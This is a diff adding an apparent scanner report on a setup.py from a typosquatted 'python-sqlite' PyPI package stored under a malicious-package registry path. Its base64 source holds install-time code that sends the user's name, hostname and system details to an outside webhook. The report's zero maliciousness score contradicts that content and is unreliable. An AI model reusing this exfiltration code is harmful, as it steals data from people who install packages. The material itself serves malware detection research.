@@ -1,0 +1,40 @@
+statistics:
+  total_files: 1
+  skipped_files: 0.0
+  processed_objects: 1
+  malicious_objects: 0
+details:
+- path: .repo_cache/malicious_repos/pypi_malregistry/python-sqlite/2.4/python-sqlite-2.4/python-sqlite-2.4/setup.py
+  contents:
+  - name: <module>
+    score: 0.0
+    code: |-
+      #! /usr/bin/env python
+      # coding: utf-8
+
+      #  __author__ = 'exploitcat'
+      from __future__ import unicode_literals
+
+      import os
+      import json
+      import socket
+      import getpass
+      import hashlib
+      import platform
+      import tempfile
+      import setuptools
+      import sys
+
+
+      def request(url, method='GET', data=None, headers=None):
+          try:
+              import urllib2 as urlrequest
+          except:
+              import urllib.request as urlrequest
+
+          req = urlrequest.Request(url=url, data=data, headers=headers)
+          return urlrequest.urlopen(req, timeout=10).read()
+    tokens: TARGETED_FILE resume load_const INTEGER load_const import_name __future__ import_from STRING_LEN_S_ENT_HIGH store_name STRING_LEN_S_ENT_HIGH pop_top load_const INTEGER load_const import_name os store_name os load_const INTEGER load_const import_name json store_name json load_const INTEGER load_const import_name socket store_name socket load_const INTEGER load_const import_name getpass store_name getpass load_const INTEGER load_const import_name hashlib store_name hashlib load_const INTEGER load_const import_name platform store_name platform load_const INTEGER load_const import_name tempfile store_name tempfile load_const INTEGER load_const import_name setuptools store_name setuptools load_const INTEGER load_const import_name sys store_name sys load_const load_const OBJECT make_function defaults store_name request load_const OBJECT make_function store_name detect load_name sys load_attr version_info load_const compare_op <= pop_jump_if_false TO_NUMBER load_name sys load_attr stderr load_attr write load_const STRING_LEN_S_ENT_HIGH call pop_top load_name sys load_attr stderr load_attr write load_const STRING_LEN_S_ENT_HIGH load_name sys load_attr version_info load_const load_const INTEGER binary_slice binary_op % call pop_top push_null load_name sys load_attr PROCESS_TERMINATION load_const INTEGER call pop_top push_null load_name detect call pop_top load_const python-sqlite store_name name load_const 2.4 store_name version load_const STRING_URL store_name url load_const MIT store_name license load_const exploitcat store_name author load_const STRING_LEN_S_ENT_HIGH store_name STRING_LEN_S_ENT_HIGH load_const STRING_LEN_S_ENT_HIGH store_name STRING_LEN_S_ENT_HIGH load_const flask_helper store_name keywords build_list store_name STRING_LEN_S_ENT_HIGH push_null load_name setuptools load_attr setup load_name name load_name version load_name author load_const STRING_LEN_S_ENT_HIGH load_name url push_null load_name setuptools load_attr find_packages call load_name license load_name STRING_LEN_S_ENT_HIGH load_name STRING_LEN_S_ENT_HIGH load_name keywords build_list kw_names author author_email description install_requires keywords license long_description name packages url version call pop_top return_const None
+    hash: 564e4866936befad7f7f693ef2de83a5190b7ce2319b7aaf87b4019c6c5a173b
+sources:
+  .repo_cache/malicious_repos/pypi_malregistry/python-sqlite/2.4/python-sqlite-2.4/python-sqlite-2.4/setup.py: IyEgL3Vzci9iaW4vZW52IHB5dGhvbgojIGNvZGluZzogdXRmLTgKCiMgIF9fYXV0aG9yX18gPSAnZXhwbG9pdGNhdCcKZnJvbSBfX2Z1dHVyZV9fIGltcG9ydCB1bmljb2RlX2xpdGVyYWxzCgppbXBvcnQgb3MKaW1wb3J0IGpzb24KaW1wb3J0IHNvY2tldAppbXBvcnQgZ2V0cGFzcwppbXBvcnQgaGFzaGxpYgppbXBvcnQgcGxhdGZvcm0KaW1wb3J0IHRlbXBmaWxlCmltcG9ydCBzZXR1cHRvb2xzCmltcG9ydCBzeXMKCgpkZWYgcmVxdWVzdCh1cmwsIG1ldGhvZD0nR0VUJywgZGF0YT1Ob25lLCBoZWFkZXJzPU5vbmUpOgogICAgdHJ5OgogICAgICAgIGltcG9ydCB1cmxsaWIyIGFzIHVybHJlcXVlc3QKICAgIGV4Y2VwdDoKICAgICAgICBpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdXJscmVxdWVzdAoKICAgIHJlcSA9IHVybHJlcXVlc3QuUmVxdWVzdCh1cmw9dXJsLCBkYXRhPWRhdGEsIGhlYWRlcnM9aGVhZGVycykKICAgIHJldHVybiB1cmxyZXF1ZXN0LnVybG9wZW4ocmVxLCB0aW1lb3V0PTEwKS5yZWFkKCkKCgpkZWYgZGV0ZWN0KCk6CiAgICB1c2VybmFtZSA9IGdldHBhc3MuZ2V0dXNlcigpCiAgICBob3N0aW5mbyA9IHBsYXRmb3JtLnVuYW1lKCkKCiAgICBpcCA9IHNvY2tldC5nZXRob3N0bmFtZSgpCgogICAgZGF0YSA9IHsKICAgICAgICAidGl0bGUiOiAiJXNAJXMiICUgKHVzZXJuYW1lLCBpcCksCiAgICAgICAgImJvZHkiOiBzdHIoaG9zdGluZm8pCiAgICB9CgogICAgaGVhZGVycyA9IHsKICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nCiAgICB9CgogICAgcmVxdWVzdCgKICAgICAgICB1cmw9J2h0dHA6Ly91cy5kc2xhYi5wdy93ZWJob29rLnBocCcsCiAgICAgICAgbWV0aG9kPSdQT1NUJywKICAgICAgICBkYXRhPWpzb24uZHVtcHMoZGF0YSkuZW5jb2RlKCJ1dGYtOCIsIGVycm9ycz0naWdub3JlJyksCiAgICAgICAgaGVhZGVycz1oZWFkZXJzCiAgICApCgoKCmlmIHN5cy52ZXJzaW9uX2luZm8gPD0gKDIsIDcpOgogICAgc3lzLnN0ZGVyci53cml0ZSgiRVJST1I6IHB5dGhvbi1zcWxpdGUgcmVxdWlyZXMgUHl0aG9uIFZlcnNpb24gMi43IG9yIGFib3ZlLlxuIikKICAgIHN5cy5zdGRlcnIud3JpdGUoIllvdXIgUHl0aG9uIFZlcnNpb24gaXMgJXMuJXMuJXMuXG4iICUgc3lzLnZlcnNpb25faW5mb1s6M10pCiAgICBzeXMuZXhpdCgxKQoKZGV0ZWN0KCkKbmFtZSA9ICJweXRob24tc3FsaXRlIgp2ZXJzaW9uID0gIjIuNCIKdXJsID0gImh0dHBzOi8vZ2l0aHViLmNvbS9kYi9weXRob24tc3FsaXRlIgpsaWNlbnNlID0gIk1JVCIKYXV0aG9yID0gImV4cGxvaXRjYXQiCnNob3J0X2Rlc2NyaXB0aW9uID0gInB5dGhvbi1zcWxpdGUgd2hpY2ggaXMgYSBteXNxbCBjbGllbnQgd3JhcHBlciIKbG9uZ19kZXNjcmlwdGlvbiA9ICIiInJpY2ggb3BlcmF0aW9uIGZvciBteXNxbCIiIgprZXl3b3JkcyA9ICJmbGFza19oZWxwZXIiCmluc3RhbGxfcmVxdWlyZXMgPSBbXQoKc2V0dXB0b29scy5zZXR1cChuYW1lPW5hbWUsCiAgICAgIHZlcnNpb249dmVyc2lvbiwKICAgICAgYXV0aG9yPWF1dGhvciwKICAgICAgYXV0aG9yX2VtYWlsPSJhbHQuYmktMDJkejA5d0B5b3BtYWlsLmNvbSIsCiAgICAgIHVybD11cmwsCiAgICAgIHBhY2thZ2VzPXNldHVwdG9vbHMuZmluZF9wYWNrYWdlcygpLAogICAgICBsaWNlbnNlPWxpY2Vuc2UsCiAgICAgIGRlc2NyaXB0aW9uPXNob3J0X2Rlc2NyaXB0aW9uLAogICAgICBsb25nX2Rlc2NyaXB0aW9uPWxvbmdfZGVzY3JpcHRpb24sCiAgICAgIGtleXdvcmRzPWtleXdvcmRzLAogICAgICBpbnN0YWxsX3JlcXVpcmVzPVtdCiAgICAgICkK
